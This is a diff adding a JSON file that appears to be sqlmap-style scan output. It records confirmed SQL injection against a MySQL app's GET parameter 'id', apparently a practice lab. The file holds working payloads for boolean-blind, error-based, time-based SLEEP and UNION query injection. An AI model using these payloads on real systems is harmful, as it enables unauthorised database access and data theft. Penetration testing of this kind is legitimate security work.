@@ -1,0 +1,79 @@
+[
+    {
+        "status": 1,
+        "type": 0,
+        "value": [
+            {
+                "suffix": "",
+                "clause": [
+                    1
+                ],
+                "ptype": 2,
+                "dbms_version": [
+                    ">= 5.0.12"
+                ],
+                "prefix": "'",
+                "conf": {
+                    "string": null,
+                    "notString": null,
+                    "titles": false,
+                    "regexp": null,
+                    "textOnly": false,
+                    "optimize": false
+                },
+                "data": {
+                    "1": {
+                        "comment": "#",
+                        "matchRatio": 0.916,
+                        "title": "OR boolean-based blind - WHERE or HAVING clause (MySQL comment)",
+                        "templatePayload": "id=__PAYLOAD_DELIMITER__-8903__PAYLOAD_DELIMITER__&Submit=Submit",
+                        "vector": "OR [INFERENCE]",
+                        "where": 2,
+                        "payload": "id=-8929' OR 4612=4612#&Submit=Submit"
+                    },
+                    "2": {
+                        "comment": "#",
+                        "matchRatio": 0.916,
+                        "title": "MySQL OR error-based - WHERE or HAVING clause",
+                        "templatePayload": "id=__PAYLOAD_DELIMITER__-8903__PAYLOAD_DELIMITER__&Submit=Submit",
+                        "vector": "OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)",
+                        "where": 2,
+                        "payload": "id=-6658' OR 1 GROUP BY CONCAT(0x716a766271,(SELECT (CASE WHEN (9340=9340) THEN 1 ELSE 0 END)),0x7162786b71,FLOOR(RAND(0)*2)) HAVING MIN(0)#&Submit=Submit"
+                    },
+                    "5": {
+                        "comment": "#",
+                        "matchRatio": 0.916,
+                        "title": "MySQL >= 5.0.12 OR time-based blind (SELECT - comment)",
+                        "templatePayload": null,
+                        "vector": "OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+                        "where": 1,
+                        "payload": "id=ads' OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))UeaD)#&Submit=Submit"
+                    },
+                    "6": {
+                        "comment": "#",
+                        "matchRatio": 0.916,
+                        "title": "MySQL UNION query (NULL) - 1 to 20 columns",
+                        "templatePayload": null,
+                        "vector": [
+                            0,
+                            2,
+                            "#",
+                            "'",
+                            "",
+                            "NULL",
+                            1,
+                            false,
+                            false
+                        ],
+                        "where": 1,
+                        "payload": "id=ads' UNION ALL SELECT CONCAT(0x716a766271,0x67734e75537764567772,0x7162786b71),NULL#&Submit=Submit"
+                    }
+                },
+                "dbms": "MySQL",
+                "parameter": "id",
+                "place": "GET",
+                "os": null
+            }
+        ]
+    }
+]
